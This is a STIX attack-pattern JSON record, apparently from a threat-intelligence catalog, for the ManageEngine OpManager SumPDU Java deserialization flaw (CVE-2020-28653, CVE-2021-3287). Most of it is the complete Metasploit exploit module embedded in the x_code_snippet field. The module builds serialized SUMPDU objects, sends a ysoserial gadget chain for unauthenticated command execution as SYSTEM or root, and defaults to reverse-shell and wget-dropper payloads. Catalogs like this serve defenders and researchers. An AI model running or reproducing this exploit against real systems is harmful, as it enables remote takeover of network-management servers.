{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--998e606c-4fe2-42bf-bb48-cae19cd389b6",
    "created": "2024-08-14T17:10:53.315211Z",
    "modified": "2024-08-14T17:10:53.315215Z",
    "name": "ManageEngine OpManager SumPDU Java Deserialization",
    "description": " An HTTP endpoint used by the Manage Engine OpManager Smart Update Manager component can be leveraged to deserialize an arbitrary Java object. This can be abused by an unauthenticated remote attacker to execute OS commands in the context of the OpManager application (NT AUTHORITY\\SYSTEM on Windows or root on Linux). This vulnerability is also present in other products that are built on top of the OpManager application. This vulnerability affects OpManager versions 12.1 - 12.5.328. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/opmanager_sumpdu_deserialization.rb",
            "external_id": "opmanager_sumpdu_deserialization.rb"
        },
        {
            "source_name": "reference",
            "url": "https://haxolot.com/posts/2021/manageengine_opmanager_pre_auth_rce/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n  include Rex::Java\n\n  JAVA_SERIALIZED_STRING = [ Serialization::TC_STRING, 0 ].pack('Cn')\n  JAVA_SERIALIZED_STRING_ARRAY = \"\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\"\\\n    \"\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\xad\\xd2\\x56\\xe7\\xe9\\x1d\\x7b\\x47\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x00\".b\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine OpManager SumPDU Java Deserialization',\n        'Description' => %q{\n          An HTTP endpoint used by the Manage Engine OpManager Smart Update Manager component can be leveraged to\n          deserialize an arbitrary Java object. This can be abused by an unauthenticated remote attacker to execute OS\n          commands in the context of the OpManager application (NT AUTHORITY\\SYSTEM on Windows or root on Linux). This\n          vulnerability is also present in other products that are built on top of the OpManager application. This\n          vulnerability affects OpManager versions 12.1 - 12.5.328.\n\n          Automatic CVE selection only works for newer targets when the build number is present in the logon page. Due\n          to issues with the serialized payload this module is incompatible with versions prior to 12.3.238 despite them\n          technically being vulnerable.\n        },\n        'Author' => [\n          'Johannes Moritz', # Original Vulnerability Research\n          'Robin Peraglie', # Original Vulnerability Research\n          'Spencer McIntyre' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'Arch' => [ARCH_CMD, ARCH_PYTHON, ARCH_X86, ARCH_X64],\n        'Platform' => [ 'win', 'linux', 'python', 'unix' ],\n        'References' => [\n          [ 'CVE', '2020-28653' ], # original CVE\n          [ 'CVE', '2021-3287' ], # patch bypass\n          [ 'URL', 'https://haxolot.com/posts/2021/manageengine_opmanager_pre_auth_rce/' ]\n        ],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'win',\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'win',\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows PowerShell',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'win',\n              'Type' => :win_psh,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'Type' => :nix_cmd\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'linux',\n              'Type' => :nix_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => 'wget',\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Python',\n            {\n              'Arch' => ARCH_PYTHON,\n              'Platform' => 'python',\n              'Type' => :python,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'python/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 8060\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2021-07-26',\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ],\n          'Stability' => [ CRASH_SAFE ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'OpManager path', '/']),\n      OptEnum.new('CVE', [ true, 'Vulnerability to use', 'Automatic', [ 'Automatic', 'CVE-2020-28653', 'CVE-2021-3287' ] ])\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/servlets/com.adventnet.tools.sum.transport.SUMHandShakeServlet'),\n      'data' => build_java_serialized_int(1002)\n    })\n    return Exploit::CheckCode::Unknown unless res\n    # the patched version will respond back with 200 OK and no data in the response body\n    return Exploit::CheckCode::Safe unless res.code == 200 && res.body.start_with?(\"\\xac\\xed\\x00\\x05\".b)\n\n    Exploit::CheckCode::Detected\n  end\n\n  def exploit\n    # Step 1: Establish a valid HTTP session\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path),\n      'keep_cookies' => true\n    })\n    unless res&.code == 200 && res.get_cookies =~ /JSESSIONID=/\n      fail_with(Failure::UnexpectedReply, 'Failed to establish an HTTP session')\n    end\n    print_status('An HTTP session cookie has been issued')\n    if (@vulnerability = datastore['CVE']) == 'Automatic'\n      # if selecting the vulnerability automatically, use version detection\n      if (version = res.body[%r{(?<=cachestart/)(\\d{6})(?=/cacheend)}]&.to_i).nil?\n        fail_with(Failure::UnexpectedReply, 'Could not identify the remote version number')\n      end\n\n      version = Rex::Version.new(\"#{version / 10000}.#{(version % 10000) / 1000}.#{version % 1000}\")\n      print_status(\"Detected version: #{version}\")\n      if version < Rex::Version.new('12.1')\n        fail_with(Failure::NotVulnerable, 'Versions < 12.1 are not affected by the vulnerability')\n      elsif version < Rex::Version.new('12.5.233')\n        @vulnerability = 'CVE-2020-28653'\n      elsif version < Rex::Version.new('12.5.329')\n        @vulnerability = 'CVE-2021-3287'\n      else\n        fail_with(Failure::NotVulnerable, 'Versions > 12.5.328 are not affected by this vulnerability')\n      end\n    end\n\n    # Step 2: Add the requestHandler to the HTTP session\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/servlets/com.adventnet.tools.sum.transport.SUMHandShakeServlet'),\n      'keep_cookies' => true,\n      'data' => build_java_serialized_int(1002)\n    })\n    unless res&.code == 200\n      fail_with(Failure::UnexpectedReply, 'Failed to setup the HTTP session')\n    end\n    print_status('The request handler has been associated with the HTTP session')\n\n    if @vulnerability == 'CVE-2021-3287'\n      # need to send an OPEN_SESSION request to the SUM PDU handler so the SUMServerIOAndDataAnalyzer object is\n      # initialized and made ready to process subsequent requests\n      send_sumpdu(build_sumpdu(data: build_java_serialized_int(0)))\n    end\n\n    # Step 3: Exploit the deserialization vulnerability to run commands\n    case target['Type']\n    when :nix_dropper\n      execute_cmdstager\n    when :win_dropper\n      execute_cmdstager\n    when :win_psh\n      execute_command(cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first,\n        remove_comspec: true\n      ))\n    else\n      execute_command(payload.encoded)\n    end\n  end\n\n  def build_java_serialized_int(int)\n    stream = Serialization::Model::Stream.new\n    stream.contents << Serialization::Model::BlockData.new(stream, [ int ].pack('N'))\n    stream.encode\n  end\n\n  def build_sumpdu(data: '')\n    # build a serialized SUMPDU object with a custom data block\n    sumpdu = \"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x27\\x63\\x6f\\x6d\\x2e\\x61\\x64\\x76\\x65\".b\n    sumpdu << \"\\x6e\\x74\\x6e\\x65\\x74\\x2e\\x74\\x6f\\x6f\\x6c\\x73\\x2e\\x73\\x75\\x6d\\x2e\".b\n    sumpdu << \"\\x70\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x2e\\x53\\x55\\x4d\\x50\\x44\\x55\\x24\".b\n    sumpdu << \"\\x29\\xfc\\x8a\\x86\\x1b\\xfd\\xed\\x03\\x00\\x03\\x5b\\x00\\x04\\x64\\x61\\x74\".b\n    sumpdu << \"\\x61\\x74\\x00\\x02\\x5b\\x42\\x4c\\x00\\x02\\x69\\x64\\x74\\x00\\x12\\x4c\\x6a\".b\n    sumpdu << \"\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\".b\n    sumpdu << \"\\x4c\\x00\\x08\\x75\\x6e\\x69\\x71\\x75\\x65\\x49\\x44\\x71\\x00\\x7e\\x00\\x02\".b\n    sumpdu << \"\\x78\\x70\\x7a\" + [ 0x14 + data.length ].pack('N')\n    sumpdu << \"\\x00\\x0c\\x4f\\x50\\x45\\x4e\\x5f\\x53\\x45\\x53\\x53\\x49\\x4f\\x4e\\x00\\x00\".b\n    sumpdu << \"\\x00\\x00\"\n    sumpdu << [ data.length ].pack('n') + data\n    sumpdu << \"\\x78\".b\n    sumpdu\n  end\n\n  def send_sumpdu(sumpdu)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet'),\n      'keep_cookies' => true,\n      'data' => [ sumpdu.length ].pack('N') + sumpdu\n    })\n    res\n  end\n\n  def execute_command(cmd, _opts = {})\n    # An executable needs to be prefixed to the command to make it compatible with the way in which the gadget chain\n    # will execute it.\n    case target['Platform']\n    when 'python'\n      cmd.prepend('python -c ')\n    when 'win'\n      cmd.prepend('cmd.exe /c ')\n    else\n      cmd.gsub!(/\\s+/, '${IFS}')\n      cmd.prepend('sh -c ')\n    end\n\n    vprint_status(\"Executing command: #{cmd}\")\n    # the frohoff/ysoserial#168 gadget chain is a derivative of CommonsBeanutils1 that has been updated to remove the\n    # dependency on the commons-collections library making it usable in this context\n    java_payload = Msf::Util::JavaDeserialization.ysoserial_payload('frohoff/ysoserial#168', cmd)\n\n    if @vulnerability == 'CVE-2020-28653'\n      # in this version, the SUM PDU that is deserialized is the malicious object\n      sum_pdu = java_payload\n    elsif @vulnerability == 'CVE-2021-3287'\n      # the patch bypass exploits a flaw in the ITOMObjectInputStream where it can be put into a state that allows\n      # arbitrary objects to be deserialized by first sending an object of the expected type\n      pdu_data = build_java_serialized_int(2) # 2 is some kind of control code necessary to execute the desired code path\n      pdu_data << JAVA_SERIALIZED_STRING\n      pdu_data << JAVA_SERIALIZED_STRING\n      pdu_data << JAVA_SERIALIZED_STRING\n      pdu_data << JAVA_SERIALIZED_STRING_ARRAY\n      pdu_data << Serialization::TC_RESET\n      pdu_data << java_payload.delete_prefix(\"\\xac\\xed\\x00\\x05\".b)\n      sum_pdu = build_sumpdu(data: pdu_data)\n    end\n\n    res = send_sumpdu(sum_pdu)\n    fail_with(Failure::UnexpectedReply, 'Failed to execute the command') unless res&.code == 200\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-07-26",
    "x_mitre_platforms": [
        "python'"
    ]
}